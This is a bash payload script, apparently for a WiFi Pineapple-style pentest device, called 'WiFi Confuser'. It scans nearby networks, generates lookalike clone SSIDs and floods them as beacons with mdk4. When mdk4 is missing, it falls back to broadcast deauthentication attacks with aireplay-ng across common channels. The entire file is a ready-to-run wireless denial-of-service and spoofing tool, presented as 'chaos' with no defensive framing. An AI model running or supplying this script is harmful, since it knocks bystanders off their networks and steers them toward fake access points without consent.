#!/bin/bash
# Title: WiFi Confuser
# Author: bad-antics
# Description: Create confusion with fake networks + deauths
# Category: nullsec/chaos

LOOT_DIR="/mmc/nullsec/confuser"
mkdir -p "$LOOT_DIR"

PROMPT "WIFI CONFUSER

Create network confusion by
cloning nearby SSIDs with
variations and deauthing.

Scans real networks, then
creates lookalike clones.

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START WIFI CONFUSER?

Duration: ${DURATION}s
Interface: $MON_IF

Will clone nearby SSIDs
and add confusing variants.

Press OK to confuse.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Starting confusion..."

SPINNER_START "Scanning for networks to clone..."
rm -f /tmp/confuser*
timeout 10 airodump-ng "$MON_IF" -w /tmp/confuser --output-format csv 2>/dev/null &
sleep 10
killall airodump-ng 2>/dev/null
SPINNER_STOP

# Extract real SSIDs
grep -E "^[0-9A-Fa-f]{2}:" /tmp/confuser-01.csv 2>/dev/null | \
    awk -F',' '{gsub(/^ +| +$/,"",$14); if($14!="") print $14}' | \
    sort -u | head -10 > /tmp/real_ssids.txt

SSID_COUNT=$(wc -l < /tmp/real_ssids.txt 2>/dev/null || echo 0)
[ "$SSID_COUNT" -eq 0 ] && echo "FreeWiFi" > /tmp/real_ssids.txt

LOG "Cloning $SSID_COUNT networks..."
LOG_FILE="$LOOT_DIR/confuse_$(date +%Y%m%d_%H%M).log"

# Generate confusing SSID variations
> /tmp/confuse_ssids.txt
while read SSID; do
    [ -z "$SSID" ] && continue
    echo "${SSID}_Guest" >> /tmp/confuse_ssids.txt
    echo "${SSID}_5G" >> /tmp/confuse_ssids.txt
    echo "${SSID}_Secure" >> /tmp/confuse_ssids.txt
    echo "${SSID}_Free" >> /tmp/confuse_ssids.txt
    echo "${SSID} 2" >> /tmp/confuse_ssids.txt
done < /tmp/real_ssids.txt

# Use mdk4 for beacon spam (much more effective than mode switching)
if command -v mdk4 >/dev/null 2>&1; then
    timeout "$DURATION" mdk4 "$MON_IF" b -f /tmp/confuse_ssids.txt -s 50 2>&1 | tee "$LOG_FILE" &
    wait $!
else
    # Fallback: deauth + channel hop
    END_TIME=$(($(date +%s) + DURATION))
    while [ $(date +%s) -lt $END_TIME ]; do
        for CH in 1 6 11; do
            [ $(date +%s) -ge $END_TIME ] && break
            iwconfig "$MON_IF" channel $CH 2>/dev/null
            aireplay-ng -0 5 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null &
            echo "$(date +%H:%M:%S) DEAUTH CH:$CH" >> "$LOG_FILE"
            sleep 3
            killall aireplay-ng 2>/dev/null
        done
    done
fi

killall mdk4 mdk3 aireplay-ng 2>/dev/null
rm -f /tmp/confuser* /tmp/real_ssids.txt /tmp/confuse_ssids.txt

PROMPT "CONFUSION COMPLETE

Duration: ${DURATION}s
Log: $LOG_FILE

Press OK to exit."
